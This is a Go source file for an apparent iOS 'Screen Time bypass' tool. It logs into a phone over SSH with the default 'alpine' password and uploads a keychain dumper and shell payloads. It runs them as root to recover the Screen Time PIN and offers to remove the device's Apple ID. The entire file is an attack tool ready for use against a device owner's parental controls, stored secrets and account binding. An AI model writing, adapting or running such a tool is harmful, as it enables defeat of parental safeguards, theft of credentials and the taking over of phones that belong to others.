package main

import (
	"bufio"
	_ "embed"
	"github.com/fatih/color"
	"github.com/melbahja/goph"
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"flag"
	"fmt"
)

//go:embed payload/keychain_dumper
var keychain_dumper []byte

//go:embed payload/run.sh
var main_payload []byte

//go:embed payload/id.sh
var id_payload []byte

//go:embed payload/entitlements.xml
var entitlements []byte

var client *goph.Client

var err error

var uploaded bool

func sendFiles() {
	_ = os.WriteFile("keychain_dumper", keychain_dumper, 0755)
	_ = os.WriteFile("run.sh", main_payload, 0755)
	_ = os.WriteFile("id.sh", id_payload, 0755)
	_ = os.WriteFile("entitlements.xml", entitlements, 0755)

	err := client.Upload("keychain_dumper", "/var/mobile/keychain_dumper")
	_, err = client.Run("chmod a+rx /var/mobile/keychain_dumper")
	err = client.Upload("run.sh", "/var/mobile/run.sh")
	_, err = client.Run("chmod a+rx /var/mobile/run.sh")
	err = client.Upload("id.sh", "/var/mobile/id.sh")
	_, err = client.Run("chmod a+rx /var/mobile/id.sh")
	err = client.Upload("entitlements.xml", "/var/mobile/entitlements.xml")
	err = os.Remove("keychain_dumper")
	err = os.Remove("run.sh")
	err = os.Remove("id.sh")
	err = os.Remove("entitlements.xml")

	if err != nil {
		close(err)
	}

	uploaded = true
}

func initSSH(pass string) {
	italic := color.New(color.Italic, color.FgCyan).SprintFunc()

	if pass != "" {
		client, err = goph.NewUnknown("mobile", "127.0.0.1", goph.Password(pass))
	} else {
		client, err = goph.NewUnknown("mobile", "127.0.0.1", goph.Password("alpine"))
	}

	if err != nil {
		if pass == "" {
			color.Red("[*] Error connecting to phone using default password " + italic("alpine"))
		} else {
			color.Red("[*] Error connecting to phone using custom password")
		}
		color.Red("[*] Please make sure your SSH tunnel is active.")
		close(nil)
	}
}

func interruptHandler(ch chan os.Signal) {
	_ = <-ch
	close(nil)
}

func main() {
	password := flag.String("p", "", "iOS SSH Password")
	help := flag.Bool("help", false, "Show help info")
	flag.Parse()

	if *help {
		fmt.Println("HELP MENU:")
		fmt.Println("\n-help\n	Shows this menu")
		fmt.Println("-p\n	Use a custom SSH password")
		close(nil)
	}

	ch := make(chan os.Signal, 1)
	signal.Notify(ch, os.Interrupt, syscall.SIGTERM)

	go interruptHandler(ch)

	c := color.New(color.FgCyan)
	reader := bufio.NewReader(os.Stdin)

	c.Println("[*] 16Screen bypass by K1ngOfPugs - 2026 Edition")
	c.Println("[*] Press ENTER to connect to phone.")
	reader.ReadString('\n')
	c.Println("[*] Connecting to phone...")

	initSSH(*password)

	c.Println("[*] Connected. Sending payload...")

	sendFiles()

	c.Println("[*] Payload upload complete. Running payload...")
	c.Println("[*] Please authenticate on your device when asked.")

	recv, _ := client.Run(`bash -c "echo alpine | sudo -S bash -c '/var/mobile/run.sh' 2>/dev/null"`)

	out := string(recv)

	c.Println("[*] Payload complete. Your Screentime PIN is: ")
	c.Println("[*] " + color.RedString(out))

	c.Println("[*] Would you like to remove your Apple ID? [y/N]: ")
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(strings.ToLower(input))
	input = string(input[0])

	if input == "y" {
		c.Println("[*] Removing Apple ID...")
		_, _ = client.Run("bash -c '/var/mobile/id.sh'")
	}

	close(nil)
}

func close(err error) {
	if uploaded == true {
		_, err = client.Run("rm /var/mobile/run.sh")
		_, err = client.Run("rm /var/mobile/id.sh")
	}

	if err != nil {
		log.Fatal(err)
	} else {
		os.Exit(0)
	}
}